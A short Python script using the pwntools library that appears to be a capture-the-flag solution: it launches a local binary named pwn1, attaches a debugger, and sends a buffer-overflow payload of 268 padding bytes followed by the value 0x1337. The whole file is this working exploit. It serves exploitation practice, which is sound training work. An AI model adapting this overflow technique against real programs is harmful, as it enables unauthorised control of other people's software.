from pwn import *



r = process("./pwn1")

payload = flat("A" * 268, p64(0x1337))

gdb.attach(r, """
    b *main + 54
    c
    """)
r.recv()

r.sendline(payload)

r.interactive()
